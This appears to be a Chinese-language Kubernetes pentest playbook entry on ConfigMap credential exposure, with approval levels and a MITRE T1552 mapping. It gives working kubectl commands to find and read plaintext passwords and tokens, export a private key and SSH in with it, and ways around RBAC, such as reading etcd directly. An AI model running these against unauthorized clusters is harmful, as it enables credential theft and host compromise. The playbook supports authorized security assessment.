---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-4.5]
mapped_compliance_families: [ConfigMap, 数据保护]
---

# configmap-data-exposure — ConfigMap 敏感数据泄露

ConfigMap 被错误地用于存储敏感凭证（DB 密码、API Key、私钥），且 RBAC 对 ConfigMap 读取宽松（`get configmaps` 全命名空间），攻击者读取 ConfigMap 直接窃取敏感数据。

---

## 1. 前置条件

- ConfigMap 存储了敏感内容（密码、token、私钥等），而非应使用 Secret
- 当前身份可读取该 ConfigMap（`get` 权限宽松）
- etcd 未对 ConfigMap 数据加密（ConfigMap 不受 EncryptionConfiguration 保护）

检查命令：
```bash
# [L0] 探测：检查 ConfigMap 读取权限
kubectl auth can-i get configmaps --all-namespaces
# 期望输出: yes

# [L0] 探测：列出所有 ConfigMap
kubectl get configmap -A | wc -l
# 期望输出: 数量较多时需逐一审查
```

## 2. 探测命令

```bash
# [L0] 探测：列出所有 ConfigMap 名称
kubectl get configmap -A -o wide
# 期望输出: ConfigMap 名称（识别 password/token/key 等可疑名）

# [L0] 探测：检查 ConfigMap 内容类型
kubectl get configmap -A -o jsonpath='{range .items[*]}{@.metadata.namespace}{"/"}{@.metadata.name}{" keys="}{@.data}{"\n"}{end}' | head
# 期望输出: 含 password/token/private_key 等敏感 key

# [L1] 探测：识别疑似含密钥的 ConfigMap
kubectl get configmap -A -o json | grep -iE "password|secret|token|private.?key|api.?key"
# 期望输出: 命中含敏感 key 的 ConfigMap
```

## 3. 攻击验证

```bash
# [L1] 攻击验证：读取目标 ConfigMap 全部数据
kubectl get configmap <name> -n <ns> -o jsonpath='{.data}'
# 期望输出: 含明文密码/token

# [L2] 攻击验证：读取特定 key 的敏感值
kubectl get configmap <name> -n <ns> -o jsonpath='{.data.password}'
# 期望输出: 明文密码字符串

# [L2] 攻击验证：导出私钥到本地
kubectl get configmap <name> -n <ns> -o jsonpath='{.data.private_key}' > id_rsa
chmod 600 id_rsa && ssh -i id_rsa <user>@<host>
# 期望输出: SSH 登录成功（证明私钥可被利用）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：低权限身份无法读取该 ConfigMap
kubectl auth can-i get configmaps -n <ns>
# 期望输出: no（前置身份限制）

# [L0] 攻击后环境对比：当前身份可读取
kubectl auth can-i get configmaps -n <ns>
# 期望输出: yes → 证明 RBAC 过度授权导致泄露

# [L1] 攻击前：常规 ServiceAccount 无法读 ConfigMap 数据
kubectl --as=system:serviceaccount:<ns>:<low-sa> get configmap <name> -n <ns> 2>&1
# 输出: forbidden

# [L1] 攻击后：当前身份可读取敏感内容
kubectl get configmap <name> -n <ns> -o jsonpath='{.data.password}'
# 输出: 明文密码 → 证明数据泄露
```

差分结论：低权限 SA 无法读 ConfigMap，当前身份因 RBAC 宽松可读取明文 `password` 值，证明 ConfigMap 敏感数据泄露成立。

## 5. 绕过策略

```bash
# [L0] 检查 RBAC 是否限制 configmap 读取
kubectl auth can-i get configmaps -n <ns>
# 若 no → 无法读取

# 绕过方式：
# - [L2] 若仅子集 ConfigMap 受限，读取未限制的 ConfigMap 中被错误放入的敏感内容
# - [L2] 若 etcd 未加密，直接通过 etcd 读取 ConfigMap 明文存储
# - [L1] 若 RBAC 限制但仍能 list，通过 list 间接获取内容
```

## 6. 证伪条件

```bash
# [L0] 无 ConfigMap 读取权限
kubectl auth can-i get configmaps -n <ns>
# 输出: no → 证伪

# [L1] ConfigMap 无敏感内容
kubectl get configmap <name> -n <ns> -o jsonpath='{.data}'
# 输出: 仅配置项（无 password/token/key）→ 证伪

# [L1] ConfigMap 内容已加密或占位
kubectl get configmap <name> -n <ns> -o jsonpath='{.data.password}'
# 输出: 占位符或加密后的密文 → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（读取并尝试利用凭证）→ **Level 4**（涉及凭证利用，需人工确认）
- **L1** 探测命令（读取 ConfigMap 内容）→ **Level 2**（只读探测，自动执行）
- **L0** 观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Credential Access
- **Technique ID**: T1552
- **Technique Name**: Unsecured Credentials
- **描述**: 攻击者利用 RBAC 对 ConfigMap 读取的宽松授权，读取被错误存储在 ConfigMap 中的明文敏感凭证（密码、私钥、token），实现凭证窃取。